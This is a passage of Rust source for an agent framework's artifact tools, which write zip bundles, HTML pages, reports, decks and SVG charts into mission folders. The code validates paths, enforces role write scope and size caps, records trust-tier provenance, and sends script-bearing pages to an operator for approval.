//! Artifact tools (`specs/014` §7): deliverables that are not Markdown text, such as a zip bundle now and
//! decks, pages, charts and spreadsheets later. They share one write path so every artifact gets the same
//! guarantees:
//!
//! - it lands in the mission's `artifacts/` folder, or under `@worktree/` when the path says so. Role manifests
//!   differ in what they may write, so when a role has no `artifacts/` folder the first mission folder it may
//!   write (`reports`, `research`, `specs`, ...) is used instead; no manifest is widened to make this work;
//! - the role's write scope, the provenance gate and a 4 MB size cap are checked *before* anyone is asked;
//! - a **sidecar** `<name>.provenance.md` records who wrote it, with which tool, from what, and at what trust
//!   tier (a binary cannot carry the front matter `write_file` embeds), and the file is stamped in the
//!   provenance index at the span's ceiling, so an artifact built from untrusted input stays untrusted.

use crate::tools::{denied, observe, str_arg, with_provenance_header, zone_of, ActionKind, Classified, Stamp, ToolCtx, ToolError, ToolExec, ToolResult, ToolSpec, ToolTier};
use delphi_adapter::claude::ToolDef;
use delphi_docs::{chart, htmlkinds, htmlpage};
use delphi_core::pathguard::{Access, Guard};
use delphi_core::provenance::{gate_write, OutputCheck, Tier};
use serde_json::{json, Value};

/// Output cap for an artifact; plain-text `write_file` stays at 256 KB.
pub const MAX_ARTIFACT_BYTES: usize = 4 << 20;
const MAX_MEMBERS: usize = 200;
/// Directories an agent could mistake for a place to put a deliverable.
const OTHER_ROOTS: [&str; 6] = ["specs", "context", "memory", "skills", "agents", "themes"];
/// Mission folders tried, in order, for a plain path; the first one the role may write wins.
const MISSION_FOLDERS: [&str; 7] = ["artifacts", "reports", "research", "specs", "comms", "councils", "threat-models"];

const TOOLS: &[&str] = &["write_archive", "write_html", "write_chart", "write_report", "write_deck"];

pub fn is_artifact_tool(name: &str) -> bool {
    TOOLS.contains(&name)
}

fn extensions(tool: &str) -> &'static [&'static str] {
    match tool {
        "write_archive" => &["zip"],
        "write_html" | "write_report" | "write_deck" => &["html", "htm"],
        "write_chart" => &["svg"],
        _ => &[],
    }
}

/// The folder a plain path goes in: the first of [`MISSION_FOLDERS`] this role may write for the mission.
pub fn default_dir(guard: &Guard, mission_id: &str) -> Option<String> {
    MISSION_FOLDERS.iter().map(|d| format!("missions/{}/{}", mission_id, d)).find(|dir| guard.check_policy(&format!("{}/x.zip", dir), Access::Write).is_ok())
}

/// Where an artifact goes: the path as given if it names `missions/…` or `@worktree/…`, otherwise inside `base`
/// (the mission folder from [`default_dir`]). The tool's extension is added when missing and enforced when present.
pub fn resolve_path(base: Option<&str>, raw: &str, tool: &str) -> Result<String, String> {
    let p = raw.trim().trim_start_matches("./");
    if p.is_empty() {
        return Err("the path is empty".into());
    }
    if p.len() > 300 || p.contains('\\') || p.chars().any(|c| c.is_control()) || p.split('/').any(|s| s == ".." || s.is_empty()) {
        return Err(format!("`{}` is not a usable artifact path (no `..`, empty segments, backslashes or control characters)", raw.chars().take(80).collect::<String>()));
    }
    let lower = p.to_lowercase();
    let full = if lower.starts_with("missions/") || lower.starts_with("@worktree/") {
        p.to_string()
    } else if p.starts_with('@') || p.starts_with('/') || p.starts_with('~') || OTHER_ROOTS.contains(&lower.split('/').next().unwrap_or("")) {
        return Err("an artifact is written into the mission's folder (give a plain path like `report.zip`) or under `@worktree/`".into());
    } else {
        match base {
            Some(b) => format!("{}/{}", b, p),
            None => return Err("this role may not write into any folder of the mission, so a plain path has nowhere to go; use a path under `@worktree/` if its manifest allows".into()),
        }
    };
    if full.to_lowercase().ends_with(".provenance.md") {
        return Err("names ending in `.provenance.md` are reserved for provenance records".into());
    }
    let exts = extensions(tool);
    let file = full.rsplit('/').next().unwrap_or("");
    match file.rsplit_once('.') {
        Some((stem, e)) if !stem.is_empty() => {
            if !exts.contains(&e.to_lowercase().as_str()) {
                return Err(format!("{} writes .{} files; give the path a .{} name", tool, exts[0], exts[0]));
            }
            Ok(full)
        }
        _ => Ok(format!("{}.{}", full, exts[0])),
    }
}

/// The record that travels with an artifact. For `missions/…` it sits beside the file. For `@worktree/…` it is
/// kept in the mission folder, so a provenance file never lands in the project's repository; a role with no
/// mission folder to write gets none, and the stamp in the mission log is the record.
pub fn sidecar_path(base: Option<&str>, resolved: &str) -> Option<String> {
    if resolved.starts_with("missions/") {
        Some(format!("{}.provenance.md", resolved))
    } else {
        base.map(|b| format!("{}/provenance/{}.provenance.md", b, resolved.trim_start_matches('@').replace('/', "__")))
    }
}

fn members_of(args: &Value) -> Result<Vec<String>, ToolError> {
    let arr = args.get("members").and_then(|m| m.as_array()).ok_or_else(|| ToolError("missing array argument `members`".into()))?;
    if arr.is_empty() || arr.len() > MAX_MEMBERS {
        return Err(ToolError(format!("`members` must list between 1 and {} files", MAX_MEMBERS)));
    }
    arr.iter()
        .map(|m| m.as_str().filter(|s| !s.trim().is_empty() && s.len() <= 300).map(|s| s.trim().to_string()).ok_or_else(|| ToolError("every member must be a non-empty path string".into())))
        .collect()
}

/// What the call would do, from the arguments alone (`specs/014` §7.2): Green in the mission, Amber in a worktree.
fn classify(tool: &str, args: &Value) -> Result<Classified, ToolError> {
    if is_page_tool(tool) {
        return classify_page(tool, args);
    }
    if tool == "write_chart" {
        return classify_chart(args);
    }
    let path = str_arg(args, "path")?;
    let members = if tool == "write_archive" { Some(members_of(args)?) } else { None };
    let resolved = resolve_path(Some("missions/<mission>/artifacts"), path, tool).map_err(ToolError)?;
    let (tier, kind) = if resolved.starts_with("@worktree/") { (ToolTier::Amber, ActionKind::WorktreeEdit) } else { (ToolTier::Green, ActionKind::MissionArtifact) };
    let dir = resolved.rsplit_once('/').map(|(d, _)| d).unwrap_or("");
    let args_hash = blake3::hash(serde_json::to_string(args).unwrap_or_default().as_bytes()).to_hex().to_string();
    let summary = match &members {
        Some(m) => format!("write {} (a zip of {} file{})", path, m.len(), if m.len() == 1 { "" } else { "s" }),
        None => format!("write {}", path),
    };
    Ok(Classified { tool: tool.into(), tier, kind, summary, payload: json!({"tool": tool, "path": path, "members": members, "args_blake3": args_hash}), pattern: format!("{} {}/*", tool, dir) })
}

fn is_page_tool(tool: &str) -> bool {
    matches!(tool, "write_html" | "write_report" | "write_deck")
}

/// A page, report or deck built from the arguments: the file, its title, and a count of what it holds.
struct Built {
    html: String,
    title: String,
    holds: String,
    script: Option<String>,
}

fn plural(n: usize, one: &str) -> String {
    format!("{} {}{}", n, one, if n == 1 { "" } else { "s" })
}

/// Build the document, or say why it cannot be built (including failing its safety check). Only `write_html`
/// takes a script; reports and decks are made of the audited runtime alone.
fn build_page(tool: &str, args: &Value, comment: Option<String>) -> Result<Built, String> {
    let e = |e: delphi_docs::DocError| e.0;
    if tool != "write_html" && args.get("script").is_some() {
        return Err(format!("{} takes no `script`; use write_html for a page that needs one (the operator approves it)", tool));
    }
    match tool {
        "write_report" => {
            let mut spec = htmlkinds::report_from_json(args).map_err(e)?;
            spec.comment = comment;
            let html = htmlkinds::render_report(&spec).map_err(e)?;
            Ok(Built { html, title: spec.title.clone(), holds: plural(spec.sections.len(), "section"), script: None })
        }
        "write_deck" => {
            let mut spec = htmlkinds::deck_from_json(args).map_err(e)?;
            spec.comment = comment;
            let html = htmlkinds::render_deck(&spec).map_err(e)?;
            Ok(Built { html, title: spec.title.clone(), holds: plural(spec.slides.len() + 1, "slide"), script: None })
        }
        _ => {
            let mut spec = htmlpage::from_json(args).map_err(e)?;
            spec.comment = comment;
            let html = htmlpage::render(&spec).map_err(e)?;
            Ok(Built { html, title: spec.title.clone(), holds: plural(spec.blocks.len(), "block"), script: spec.script.clone() })
        }
    }
}

/// Does any embedded chart name a data file? Those are read through the role's access at run time, not here.
fn has_data_from(v: &Value) -> bool {
    match v {
        Value::Object(m) => m.iter().any(|(k, x)| (k == "chart" && x.pointer("/data/from").is_some()) || has_data_from(x)),
        Value::Array(a) => a.iter().any(has_data_from),
        _ => false,
    }
}

/// The arguments with every embedded chart's `data: {from}` replaced by the file's rows. `on_read` sees each file
/// read and may return its trust line, which is added to that chart's `source` so it prints under the chart.
fn embed_data(guard: &Guard, args: &Value, on_read: &mut dyn FnMut(&str, &[u8]) -> Option<String>) -> Result<Value, ToolResult> {
    fn walk(guard: &Guard, v: &mut Value, on_read: &mut dyn FnMut(&str, &[u8]) -> Option<String>) -> Result<(), ToolResult> {
        match v {
            Value::Object(m) => {
                if let Some(c) = m.get_mut("chart").filter(|c| c.pointer("/data/from").is_some()) {
                    let (mut a, read) = chart_args(guard, c)?;
                    if let Some((from, bytes)) = read {
                        if let Some(trust) = on_read(&from, &bytes) {
                            let given = a.get("source").and_then(|s| s.as_str()).map(String::from);
                            a["source"] = json!(match given {
                                Some(g) => format!("{} · {}", g, trust),
                                None => trust,
                            });
                        }
                    }
                    *c = a;
                }
                for x in m.values_mut() {
                    walk(guard, x, on_read)?;
                }
            }
            Value::Array(a) => {
                for x in a {
                    walk(guard, x, on_read)?;
                }
            }
            _ => {}
        }
        Ok(())
    }
    let mut out = args.clone();
    walk(guard, &mut out, on_read)?;
    Ok(out)
}

/// A page, report or deck. Without a script it is Green in the mission (Amber in a worktree, as any worktree edit).
/// A page with a free-form script is **always** put to the operator, in full: it is classified so that no
/// permission mode approves it (`SpecDraft` asks every time), and "allow similar" covers only this exact call. That
/// review, with the page's content security policy, is the safety of a script; the linter only catches accidents.
/// Reports and decks never carry a script.
fn classify_page(tool: &str, args: &Value) -> Result<Classified, ToolError> {
    let path = str_arg(args, "path")?;
    let resolved = resolve_path(Some("missions/<mission>/artifacts"), path, tool).map_err(ToolError)?;
    // Build it now, so a page that would fail its safety check is refused before anyone is asked. Charts that name a
    // data file cannot be drawn until the file is read, so those are only checked when the file is.
    let (title, holds, script, bytes, hash) = if has_data_from(args) {
        if tool != "write_html" && args.get("script").is_some() {
            return Err(ToolError(format!("{} takes no `script`; use write_html for a page that needs one", tool)));
        }
        (args.get("title").and_then(|t| t.as_str()).unwrap_or("").to_string(), "charts from data files".to_string(), args.get("script").and_then(|x| x.as_str()).map(String::from), None, None)
    } else {
        let b = build_page(tool, args, None).map_err(ToolError)?;
        let h = blake3::hash(b.html.as_bytes()).to_hex().to_string();
        let n = b.html.len();
        (b.title, b.holds, b.script, Some(n), Some(h))
    };
    let args_hash = blake3::hash(serde_json::to_string(args).unwrap_or_default().as_bytes()).to_hex().to_string();
    let dir = resolved.rsplit_once('/').map(|(d, _)| d).unwrap_or("");
    let (tier, kind, pattern) = match &script {
        Some(_) => (ToolTier::Amber, ActionKind::SpecDraft, format!("{} script {}", tool, &args_hash[..16])),
        None if resolved.starts_with("@worktree/") => (ToolTier::Amber, ActionKind::WorktreeEdit, format!("{} {}/*", tool, dir)),
        None => (ToolTier::Green, ActionKind::MissionArtifact, format!("{} {}/*", tool, dir)),
    };
    let what = match tool {
        "write_report" => "a report",
        "write_deck" => "a slide deck",
        _ => "a page",
    };
    let summary = format!("write {} ({}, {}{})", path, what, holds, if script.is_some() { ", WITH A SCRIPT to read before approving" } else { "" });
    let payload = json!({"tool": tool, "path": path, "title": title, "holds": holds, "script": script, "bytes": bytes, "page_blake3": hash, "args_blake3": args_hash});
    Ok(Classified { tool: tool.into(), tier, kind, summary, payload, pattern })
}

/// A chart. Charts hold no script, so one is Green in the mission and Amber in a worktree like any worktree edit.
/// Data read from a file is not opened at classification (it needs the role's read access); the rest is checked now.
fn classify_chart(args: &Value) -> Result<Classified, ToolError> {
    let path = str_arg(args, "path")?;
    let resolved = resolve_path(Some("missions/<mission>/artifacts"), path, "write_chart").map_err(|e| if path.to_lowercase().ends_with(".png") { ToolError("write_chart writes .svg files; PNG output is not available yet (an SVG opens in any browser)".into()) } else { ToolError(e) })?;
    if args.get("format").and_then(|f| f.as_str()).is_some_and(|f| f != "svg") {
        return Err(ToolError("`format` is svg for now; PNG output is not available yet".into()));
    }
    let from = args.pointer("/data/from").and_then(|f| f.as_str());
    let (series, rows) = match from {
        Some(_) => (None, None),
        None => {
            let spec = chart::from_json(args).map_err(|e| ToolError(e.0))?;
            (Some(spec.series.len()), Some(spec.x.len()))
        }
    };
    let kind = str_arg(args, "type").unwrap_or("chart").to_string();
    let title = args.get("title").and_then(|t| t.as_str()).unwrap_or("").to_string();
    let (tier, action) = if resolved.starts_with("@worktree/") { (ToolTier::Amber, ActionKind::WorktreeEdit) } else { (ToolTier::Green, ActionKind::MissionArtifact) };
    let dir = resolved.rsplit_once('/').map(|(d, _)| d).unwrap_or("");
    let args_hash = blake3::hash(serde_json::to_string(args).unwrap_or_default().as_bytes()).to_hex().to_string();
    Ok(Classified {
        tool: "write_chart".into(),
        tier,
        kind: action,
        summary: format!("write {} (a {} chart{})", path, kind, from.map(|f| format!(" of {}", f)).unwrap_or_default()),
        payload: json!({"tool": "write_chart", "path": path, "type": kind, "title": title, "series": series, "rows": rows, "from": from, "args_blake3": args_hash}),
        pattern: format!("write_chart {}/*", dir),
    })
}

/// A file a tool read for its data: its logical path and its bytes.
type FileRead = (String, Vec<u8>);

/// The arguments with `data: {from}` replaced by the file's contents, plus the file read (path, bytes) if there was one.
/// Reading goes through the role's read access; the caller records what was read (it lowers the span's trust).
fn chart_args(guard: &Guard, args: &Value) -> Result<(Value, Option<FileRead>), ToolResult> {
    let Some(from) = args.pointer("/data/from").and_then(|f| f.as_str()) else { return Ok((args.clone(), None)) };
    let lower = from.to_lowercase();
    if !(lower.ends_with(".csv") || lower.ends_with(".tsv")) {
        return Err(ToolResult::err(format!("`data.from` reads .csv and .tsv files for now; `{}` is neither. Read it with read_doc and pass the numbers as `columns` and `rows`", from)));
    }
    let (bytes, truncated) = guard.read_file(from, MAX_ARTIFACT_BYTES).map_err(denied)?;
    if truncated {
        return Err(ToolResult::err(format!("`{}` is larger than 4 MB; summarise it first", from)));
    }
    let (columns, rows) = delphi_docs::read_table(&bytes, 20_000).map_err(|e| ToolResult::err(e.0))?;
    let mut a = args.clone();
    a["data"] = json!({"columns": columns, "rows": rows});
    Ok((a, Some((from.to_string(), bytes))))
}

/// Where a call will write: the artifact and, if there is one, its provenance record.
pub struct Target {
    pub path: String,
    pub sidecar: Option<String>,
}

/// Everything that can refuse an artifact without touching the filesystem, run before the operator is asked:
/// the path, the role's write scope (for the file and its provenance record), the provenance gate, and read
/// access to each input.
pub fn precheck(guard: &Guard, ceiling: Tier, mission_id: &str, tool: &str, args: &Value) -> Result<Target, ToolResult> {
    let path = str_arg(args, "path").map_err(|e| ToolResult::err(e.0))?;
    let base = default_dir(guard, mission_id);
    let resolved = resolve_path(base.as_deref(), path, tool).map_err(ToolResult::err)?;
    let sidecar = sidecar_path(base.as_deref(), &resolved);
    for p in std::iter::once(&resolved).chain(sidecar.iter()) {
        guard.check_policy(p, Access::Write).map_err(denied)?;
        gate_write(p, ceiling).map_err(|g| ToolResult::err(g.to_string()))?;
    }
    if tool == "write_archive" {
        for m in members_of(args).map_err(|e| ToolResult::err(e.0))? {
            guard.check_policy(&m, Access::Read).map_err(denied)?;
        }
    }
    if is_page_tool(tool) {
        let a = embed_data(guard, args, &mut |_, _| None)?;
        build_page(tool, &a, None).map_err(ToolResult::err)?;
    }
    if tool == "write_chart" {
        let (a, _) = chart_args(guard, args)?;
        chart::from_json(&a).map_err(|e| ToolResult::err(e.0))?;
    }
    Ok(Target { path: resolved, sidecar })
}

/// Write `bytes` as the artifact, with its provenance record, and stamp both.
pub fn write_artifact(ctx: &mut ToolCtx, target: &Target, bytes: &[u8], tool: &str, inputs: &[String]) -> ToolResult {
    let resolved = target.path.as_str();
    if bytes.len() > MAX_ARTIFACT_BYTES {
        return ToolResult::err(format!("the artifact is {} bytes; the limit is {} (4 MB)", bytes.len(), MAX_ARTIFACT_BYTES));
    }
    let created = match ctx.guard.write_atomic(resolved, bytes) {
        Ok(c) => c,
        Err(d) => return denied(d),
    };
    let tier = ctx.span.output_tier(OutputCheck::Unverified);
    let hash = blake3::hash(bytes).to_hex().to_string();
    let (zone, rel) = zone_of(resolved);
    ctx.index.stamp(zone, &rel, &hash, tier);
    ctx.stamps.push(Stamp { zone, path: rel, blake3: hash.clone(), tier });
    let head = format!("{} {} ({} bytes, blake3 {}…, tier {} {})", if created { "created" } else { "replaced" }, resolved, bytes.len(), &hash[..12], tier, tier.name());
    let Some(side) = &target.sidecar else {
        return ToolResult::ok(format!("{}; no provenance record file (this role cannot write the mission folder): the stamp is in the mission log", head));
    };

    let name = resolved.rsplit('/').next().unwrap_or(resolved);
    let mut body = format!(
        "---\nartifact: {name}\nartifact_path: \"{resolved}\"\nartifact_blake3: {hash}\nartifact_bytes: {n}\nartifact_tier: \"{tier} {tname}\"\nproduced_by: {tool}\ntags: [artifact, provenance]\n---\n# Provenance of {name}\n\nWritten by role `{role}` in mission `{mission}` with `{tool}` at {now}.\n\nTrust: {tier} {tname}. The tier is the lowest-trust input that entered the span that wrote this file; it is computed, not declared, and an agent cannot raise it.\n",
        name = name,
        resolved = resolved,
        hash = hash,
        n = bytes.len(),
        tier = tier,
        tname = tier.name(),
        tool = tool,
        role = ctx.role,
        mission = ctx.mission_id,
        now = ctx.now_rfc3339,
    );
    if !inputs.is_empty() {
        body.push_str("\nInputs:\n");
        for i in inputs {
            body.push_str(&format!("- {}\n", i));
        }
    }
    let sidecar = match with_provenance_header(&body, ctx.role, ctx.mission_id, ctx.now_rfc3339, side) {
        Ok(s) => s,
        Err(e) => return ToolResult::err(format!("the artifact was written but its provenance record could not be: {}", e)),
    };
    if let Err(d) = ctx.guard.write_atomic(side, sidecar.as_bytes()) {
        return denied(d);
    }
    let shash = blake3::hash(sidecar.as_bytes()).to_hex().to_string();
    let (szone, srel) = zone_of(side);
    ctx.index.stamp(szone, &srel, &shash, tier);
    ctx.stamps.push(Stamp { zone: szone, path: srel, blake3: shash, tier });
    ToolResult::ok(format!("{}; provenance record: {}", head, side))
}

/// A member's name inside the archive: its logical path without the leading `@`.
fn member_name(logical: &str) -> String {
    delphi_core::pathguard::canonical(logical).unwrap_or_else(|_| logical.to_string()).trim_start_matches('@').to_string()
}

fn write_archive(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
    let target = match precheck(ctx.guard, ctx.span.ceiling(), ctx.mission_id, "write_archive", args) {
        Ok(t) => t,
        Err(e) => return e,
    };
    let members = match members_of(args) {
        Ok(m) => m,
        Err(e) => return ToolResult::err(e.0),
    };
    let mut zip = delphi_docs::ZipWriter::new();
    let (mut total, mut inputs) = (0usize, vec![]);
    for m in &members {
        let (bytes, truncated) = match ctx.guard.read_file(m, MAX_ARTIFACT_BYTES - total + 1) {
            Ok(r) => r,
            Err(d) => return denied(d),
        };
        total += bytes.len();
        if truncated || total > MAX_ARTIFACT_BYTES {
            return ToolResult::err(format!("the files add up to more than {} bytes (4 MB); archive fewer or smaller files", MAX_ARTIFACT_BYTES));
        }
        // What goes into the archive is read by this span: its trust counts against the result.
        observe(ctx, m, &bytes);
        if let Err(e) = zip.add(&member_name(m), &bytes) {
            return ToolResult::err(e.0);
        }
        inputs.push(format!("{} ({} bytes, blake3 {})", m, bytes.len(), blake3::hash(&bytes).to_hex()));
    }
    write_artifact(ctx, &target, &zip.finish(), "write_archive", &inputs)
}

fn write_html(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
    write_page(ctx, "write_html", args)
}

fn write_report(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
    write_page(ctx, "write_report", args)
}

fn write_deck(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
    write_page(ctx, "write_deck", args)
}

fn write_page(ctx: &mut ToolCtx, tool: &str, args: &Value) -> ToolResult {
    let target = match precheck(ctx.guard, ctx.span.ceiling(), ctx.mission_id, tool, args) {
        Ok(t) => t,
        Err(e) => return e,
    };
    // Data files drawn into charts were read by this span: their trust counts against the document, and each chart says so.
    let mut inputs = vec![];
    let guard = ctx.guard;
    let a = match embed_data(guard, args, &mut |from, bytes| {
        let tier = observe(ctx, from, bytes);
        inputs.push(format!("{} ({} bytes, blake3 {})", from, bytes.len(), blake3::hash(bytes).to_hex()));
        Some(format!("data: {} (trust {} {})", from, tier, tier.name()))
    }) {
        Ok(a) => a,
        Err(e) => return e,
    };
    // the in-file provenance comment (the sidecar has the hash, which cannot be inside the file it describes)
    let tier = ctx.span.output_tier(OutputCheck::Unverified);
    let comment = format!(
        "delphi artifact: written by role {} in mission {} with {} at {}; trust {} {}{}",
        ctx.role,
        ctx.mission_id,
        tool,
        ctx.now_rfc3339,
        tier,
        tier.name(),
        target.sidecar.as_ref().map(|s| format!("; provenance record: {}", s.rsplit('/').next().unwrap_or(s))).unwrap_or_default()
    );
    let built = match build_page(tool, &a, Some(comment)) {
        Ok(b) => b,
        Err(e) => return ToolResult::err(e),
    };
    inputs.insert(0, format!("title: {}", built.title.chars().take(120).collect::<String>()));
    inputs.insert(1, format!("contents: {}", built.holds));
    if tool == "write_html" {
        inputs.push(format!("free-form script: {}", if built.script.is_some() { "yes (approved by the operator)" } else { "no" }));
    }
    write_artifact(ctx, &target, built.html.as_bytes(), tool, &inputs)
}

fn write_chart(ctx: &mut ToolCtx, args: &Value) -> ToolResult {
    let target = match precheck(ctx.guard, ctx.span.ceiling(), ctx.mission_id, "write_chart", args) {
        Ok(t) => t,
        Err(e) => return e,
    };
    let (a, read) = match chart_args(ctx.guard, args) {
        Ok(r) => r,
        Err(e) => return e,
    };
    // The data this chart draws was read by this span: its trust counts against the chart, and is printed on it.
    let mut inputs = vec![];
    let mut spec_args = a;
    if let Some((from, bytes)) = &read {
        let tier = observe(ctx, from, bytes);
        let trust = format!("data: {} (trust {} {})", from, tier, tier.name());
        let given = spec_args.get("source").and_then(|s| s.as_str()).map(|s| s.to_string());
        spec_args["source"] = json!(match given {
            Some(s) => format!("{} · {}", s, trust),
            None => trust,
        });
        inputs.push(format!("{} ({} bytes, blake3 {})", from, bytes.len(), blake3::hash(bytes).to_hex()));
    }
    let spec = match chart::from_json(&spec_args) {
        Ok(s) => s,
        Err(e) => return ToolResult::err(e.0),
    };
    let tier = ctx.span.output_tier(OutputCheck::Unverified);
    let comment = htmlpage::comment_text(&format!(
        "delphi artifact: written by role {} in mission {} with write_chart at {}; trust {} {}{}",
        ctx.role,
        ctx.mission_id,
        ctx.now_rfc3339,
        tier,
        tier.name(),
        target.sidecar.as_ref().map(|s| format!("; provenance record: {}", s.rsplit('/').next().unwrap_or(s))).unwrap_or_default()
    ));
    let svg = chart::render_svg(&spec, Some(&comment));
    inputs.push(format!("{} chart: {} series, {} points, title: {}", spec_args.get("type").and_then(|t| t.as_str()).unwrap_or("?"), spec.series.len(), spec.x.len(), spec.title.chars().take(100).collect::<String>()));
    write_artifact(ctx, &target, svg.as_bytes(), "write_chart", &inputs)
}

const CHART_BLOCK: &str = "{type:\"chart\", chart:{…the same description write_chart takes, with its own data…}, caption?} draws a chart into the document (at most 12; `data.from` may name a .csv/.tsv you can read), {type:\"grid\", columns:2|3, blocks:[…]} puts blocks side by side";

pub fn specs() -> Vec<ToolSpec> {
    vec![ToolSpec {
        def: ToolDef {
            name: "write_archive".into(),
            description: "Bundle files you can already read into a .zip. `path` is where to put it: a plain name like `evidence.zip` goes in the mission's folder (artifacts/, or the first mission folder your role may write); `@worktree/…` writes into the build's worktree. `members` lists the files, by logical path (for example `@project/app/src/lib.rs`, `missions/<id>/notes.md`). At most 200 files and 4 MB in all. Each member is stored under its path without the leading `@`. A provenance record is written beside the archive, and the archive is as trusted as the least trusted file in it.".into(),
            input_schema: json!({"type": "object", "required": ["path", "members"], "properties": {"path": {"type": "string"}, "members": {"type": "array", "items": {"type": "string"}, "minItems": 1, "maxItems": MAX_MEMBERS}}}),
        },
        requires_write_scope: true,
        classify: |tool, args| classify(tool, args),
        exec: ToolExec::Local(write_archive),
    },
    ToolSpec {
        def: ToolDef {
            name: "write_html".into(),
            description: "Write a self-contained web page (one .html file) that opens in any browser with no network. Describe it as data and the tool writes the markup: `title`, then `blocks` (or `body_md` for a single markdown block). Block types: {type:\"markdown\", text} (headings, lists, tables, emphasis, code; raw HTML is shown as text; only #anchor links are clickable and other links print their address); {type:\"table\", columns:[…], rows:[[…]], caption?, sortable?, filter?} (up to 2000 rows × 40 columns; sortable and filter add click-to-sort and a search box); {type:\"tabs\", tabs:[{title, blocks:[…]}]}; {type:\"code\", text, copy?}; {type:\"callout\", kind:\"note\"|\"warning\"|\"tip\", text}; {type:\"stats\", items:[{label, value, delta?}]}; {type:\"chart\", chart:{…as write_chart…}, caption?}; {type:\"grid\", columns:2|3, blocks:[…]}. `theme` is auto, light or dark. Pages are responsive, follow the reader's light/dark setting and print cleanly. `path` is a plain name like `report.html` (goes in the mission's folder) or `@worktree/…`. Prefer no script: sorting, filtering, tabs and copy buttons are built in. An optional `script` (light DOM scripting only) is allowed but is shown to the operator in full and approved every time; it may not use the network, build code at run time, navigate, or rewrite markup, and the tool refuses it if it tries. A provenance record is written beside the page, and the page is as trusted as the least trusted input you read.".into(),
            input_schema: json!({"type": "object", "required": ["path", "title"], "properties": {
                "path": {"type": "string"},
                "title": {"type": "string"},
                "body_md": {"type": "string", "description": "markdown for a single block; use blocks for anything richer"},
                "blocks": {"type": "array", "maxItems": 200, "items": {"type": "object", "required": ["type"], "properties": {"type": {"type": "string", "enum": ["markdown", "table", "tabs", "code", "callout", "stats", "chart", "grid"]}}}},
                "theme": {"type": "string", "enum": ["auto", "light", "dark"]},
                "script": {"type": "string", "description": "optional; shown to the operator in full and approved every time"}
            }}),
        },
        requires_write_scope: true,
        classify: |tool, args| classify(tool, args),
        exec: ToolExec::Local(write_html),
    },
    ToolSpec {
        def: ToolDef {
            name: "write_chart".into(),
            description: "Draw a chart as a self-contained .svg (light and dark, accessible, no script). Describe it, do not draw it: `type` is bar (columns), hbar (rows, for many or long labels), line, area (one series), scatter (at most 2 series) or hist (a distribution of one column); `title` states the point (\"Median latency fell 12% in 0.2.3\"); `data` is {columns:[names], rows:[[...]]} or {from: \"<a .csv/.tsv you can read>\"}; `x` and `y` name columns (`y` can list several series; or `series_by` names a column that splits one `y` into series); `x_order: \"ordered\"` lets a line use ordered names such as versions; `format: {y: \"0,0 ms\"}` writes numbers; `scale: {y: \"log\"}` or `{y_zero: false}` (bars normally start at zero and the chart says when they do not); `annotations: [{x, label}]` marks a moment; `subtitle`, `source`, `size` (wide|square|tall), `theme`. The tool checks the form fits the data and refuses with a better one: a one-number chart is a stats block, a line needs numbers or dates on x, more than 4 series (2 for scatter) should be folded into Other or shown as several charts, and two quantities on very different scales should not share an axis. `path` is a plain name like `latency.svg` (goes in the mission's folder) or `@worktree/…`. A provenance record is written beside it and the chart is as trusted as the data it draws; data read from a file has its trust printed under the chart.".into(),
            input_schema: json!({"type": "object", "required": ["path", "type", "title", "data"], "properties": {
                "path": {"type": "string"},
                "type": {"type": "string", "enum": ["bar", "hbar", "line", "area", "scatter", "hist"]},
                "title": {"type": "string"},
                "subtitle": {"type": "string"},
                "data": {"type": "object", "description": "{columns: [names], rows: [[...]]} or {from: path to a .csv/.tsv}"},
                "x": {"type": "string"},
                "y": {"description": "a column name or an array of column names"},
                "series_by": {"type": "string"},
                "x_order": {"type": "string", "enum": ["ordered"]},
                "scale": {"type": "object"},
                "format": {"type": "object", "description": "number formats, for example {y: \"0,0 ms\"}"},
                "annotations": {"type": "array", "maxItems": 5, "items": {"type": "object"}},
                "bins": {"type": "integer", "minimum": 2, "maximum": 60},
                "source": {"type": "string"},
                "size": {"type": "string", "enum": ["wide", "square", "tall"]},
                "theme": {"type": "string", "enum": ["auto", "light", "dark"]}
            }}),
        },
        requires_write_scope: true,
        classify: |tool, args| classify(tool, args),
        exec: ToolExec::Local(write_chart),
    },
    ToolSpec {
        def: ToolDef {
            name: "write_report".into(),
            description: format!("Write a report as one self-contained .html file that reads well on a screen and prints cleanly (\"Save as PDF\" gives clean pages). `title`, `subtitle?`, `summary?` (markdown shown first), then `sections`: [{{heading, body_md?, blocks?, chart?}}]; a contents list is added for three or more sections (`toc` forces it on or off). A section's `chart` is a shorthand for a chart block. Block types are those of write_html: markdown, table, tabs, code, callout, stats, and {}. Markdown headings inside a section sit under its heading. `theme` is auto, light or dark. There is no script option: for that, use write_html. `path` is a plain name like `q3-review.html` (goes in the mission's folder) or `@worktree/…`. A provenance record is written beside it and the report is as trusted as the least trusted input you read.", CHART_BLOCK),
            input_schema: json!({"type": "object", "required": ["path", "title", "sections"], "properties": {
                "path": {"type": "string"},
                "title": {"type": "string"},
                "subtitle": {"type": "string"},
                "summary": {"type": "string"},
                "toc": {"type": "boolean"},
                "sections": {"type": "array", "minItems": 1, "maxItems": 40, "items": {"type": "object", "required": ["heading"], "properties": {"heading": {"type": "string"}, "body_md": {"type": "string"}, "blocks": {"type": "array", "items": {"type": "object"}}, "chart": {"type": "object"}}}},
                "theme": {"type": "string", "enum": ["auto", "light", "dark"]}
            }}),
        },
        requires_write_scope: true,
        classify: |tool, args| classify(tool, args),
        exec: ToolExec::Local(write_report),
    },
    ToolSpec {
        def: ToolDef {
            name: "write_deck".into(),
            description: format!("Write a slide deck as one self-contained .html file (no network) that opens in any browser. `title`, `subtitle?`, `author?`, then `slides`: [{{title, body_md?, blocks?, chart?, notes?}}]; a title slide is made for you from the title, so start `slides` with the first real slide. Keep each slide to one point: a short title that states it, a few bullets or one chart or table, and the detail in `notes`. A slide's `chart` is a shorthand for a chart block; block types are those of write_html: markdown, table, code, callout, stats, and {}. In the browser a deck shows one slide at a time: arrow keys, Page Up/Down, space and swipe move, Home/End jump, `n` shows the speaker notes, `i` the slide index, and there are buttons for the same. Printing gives one slide per page with the notes beneath it. `theme` is auto, light or dark. There is no script option. `path` is a plain name like `roadmap.html` (goes in the mission's folder) or `@worktree/…`. A provenance record is written beside it and the deck is as trusted as the least trusted input you read.", CHART_BLOCK),
            input_schema: json!({"type": "object", "required": ["path", "title", "slides"], "properties": {
                "path": {"type": "string"},
                "title": {"type": "string"},
